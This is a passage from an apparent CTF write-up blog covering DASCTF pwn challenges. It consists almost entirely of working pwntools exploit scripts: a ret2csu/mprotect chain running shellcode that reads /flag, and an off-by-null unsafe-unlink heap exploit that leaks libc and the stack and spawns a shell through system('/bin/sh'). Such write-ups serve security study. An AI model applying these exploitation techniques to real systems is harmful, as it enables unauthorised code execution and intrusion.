<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">initial函数的地址:</span><span class="sh">'</span><span class="p">)</span>
<span class="n">x</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
<span class="n">elf_base</span> <span class="o">=</span> <span class="n">x</span> <span class="o">-</span> <span class="mi">4681</span>
<span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">elf_base</span>
<span class="c1">#bss = elf.bss()
</span><span class="n">bss</span> <span class="o">=</span> <span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0x4000</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">elf_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">bss</span><span class="sh">'</span><span class="p">)</span>




<span class="n">magic</span> <span class="o">=</span> <span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0x0000000000001232</span> <span class="c1"># add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret
</span><span class="n">rdi</span>   <span class="o">=</span> <span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0x0000000000001643</span> <span class="c1"># pop rdi ; ret
</span><span class="n">rsi</span>   <span class="o">=</span> <span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0x0000000000001641</span> <span class="c1"># pop rsi ; pop r15 ; ret
</span><span class="n">read_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">]</span>
<span class="n">read_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">]</span>
<span class="n">csu1</span> <span class="o">=</span> <span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0x0163A</span>
<span class="n">csu2</span> <span class="o">=</span> <span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0x01620</span>
<span class="n">lret</span> <span class="o">=</span> <span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0x015CF</span>




<span class="c1">#gdb.attach(io,'brva 0x000147B')# 00147B
#gdb.attach(io,'brva 0x001632')
</span><span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">pause</span><span class="p">()</span>

<span class="n">pay</span>  <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x38</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">csu1</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># rbx
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># rbp
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># r12 rdi
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0x200</span><span class="p">)</span> <span class="c1"># r13 rsi
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span> <span class="c1"># r14 rdx
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">])</span> <span class="c1"># r15 call_addr
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">csu2</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0x200</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">lret</span><span class="p">)</span> <span class="c1"># leave ret
</span><span class="nf">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>


<span class="nf">pause</span><span class="p">()</span>
<span class="c1">#libc = elf.libc
</span><span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./libc-2.31.so</span><span class="sh">'</span><span class="p">)</span>
<span class="n">mprotect</span>    <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">mprotect</span><span class="sh">'</span><span class="p">]</span>
<span class="n">read_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">]</span>
<span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">mprotect</span> <span class="o">-</span> <span class="n">read_offset</span><span class="p">)</span>

<span class="n">target</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">]</span>

<span class="n">pay</span>  <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">csu1</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span> <span class="c1"># rbx
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">target</span><span class="o">+</span><span class="mh">0x3d</span><span class="p">)</span> <span class="c1"># rbp
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">magic</span><span class="p">)</span>

<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">csu1</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># rbx
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># rbp
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="c1"># r12 # rdi
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span> <span class="c1"># rsi
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span> <span class="c1"># rdx
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0x200</span><span class="o">+</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1"># ret
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">csu2</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">lret</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">7</span>

<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">])</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0x200</span><span class="o">+</span><span class="nf">len</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x10</span>
<span class="c1">#pay += asm(shellcraft.open('flag'))
#pay += asm(shellcraft.sendfile(1,'rax',0,0x50))
#pay += asm(shellcraft.sh())
</span><span class="n">pay</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">openat</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="sh">'</span><span class="s">/flag</span><span class="sh">'</span><span class="p">))</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">sendfile</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="sh">'</span><span class="s">rax</span><span class="sh">'</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x50</span><span class="p">))</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>


<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h2 id="pwn-garbage"><span class="me-2">Pwn-garbage</span><a href="#pwn-garbage" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<p>​<a href="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231127210418-ov5gt36.png" class="popup img-link  shimmer"><img src="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231127210418-ov5gt36.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>off by null</li>
</ul>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./challenge</span><span class="sh">'</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="c1">#io = remote('node4.buuoj.cn',25983)
</span><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="o">=</span><span class="mh">0x4f8</span><span class="p">,</span><span class="n">text</span><span class="o">=</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">pls input the idx of garbage: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">pls input the size of garbage: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">pls input the content of garbage: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">rm</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">pls input the idx of garbage: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">pls input the idx of garbage: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Content: </span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">text</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">your choice: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">pls input the idx of garbage: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">pls input the new content of garbage:</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>

<span class="nf">add</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">note</span> <span class="o">=</span> <span class="mh">0x0404060</span>
<span class="n">fd</span> <span class="o">=</span> <span class="n">note</span> <span class="o">-</span> <span class="mh">0x18</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">note</span> <span class="o">-</span> <span class="mh">0x10</span>
<span class="n">pay</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x4f1</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">)</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>
<span class="nf">rm</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">pay</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x403FB8</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>
<span class="nf">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">puts</span><span class="sh">'</span><span class="p">]</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>


<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
<span class="n">env</span> <span class="o">=</span>  <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">environ</span><span class="sh">'</span><span class="p">]</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
<span class="n">libc_rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
<span class="n">rdi</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rdi</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">))</span>

<span class="n">pay</span>  <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">env</span><span class="p">)</span>
<span class="c1">#pay += p64(fio+)
</span><span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>
<span class="nf">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">stack</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">stack</span><span class="sh">'</span><span class="p">)</span>
<span class="n">ret</span><span class="o">=</span> <span class="n">stack</span> <span class="o">-</span> <span class="mi">352</span>
<span class="c1">#gdb.attach(io,'b *0x004017E5')
</span><span class="n">pay</span>  <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>
<span class="c1">#fake_IO = 0x404100
</span>
<span class="n">pay</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>


<span class="c1">## house of apple2  直接 puts 刷新IO 可以控制 栈有问题
## puts IO 
#fake_IO_FILE += p64(libc_base + ogg[3])
#fake_IO_FILE  = p64(0) * 2
#fake_IO_FILE += p64(setcontext + 61)
#fake_IO_FILE += p64(0) * 14
#fake_IO_FILE += p64(fake_IO_addr+0x100)
#fake_IO_FILE += p64(0) * 2
#fake_IO_FILE += p64(fake_IO_addr)
#fake_IO_FILE += p64(0) * 6
#fake_IO_FILE += p64(_IO_wfile_jumps + 0x20-0x40)
#fake_IO_FILE += p64(fake_IO_addr-0x68+0x10)
#edit(2,fake_IO_FILE+b'\n')
#print(_IO_wfile_jumps)
#edit(0,p64(fio)+b'\n')
</span>
<span class="c1">#edit(2,fake_IO_FILE)
</span>

<span class="c1">#add(0x400,fake_IO_FILE)
</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h2 id="pwn-shaopi"><span class="me-2">Pwn-shaopi</span><a href="#pwn-shaopi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
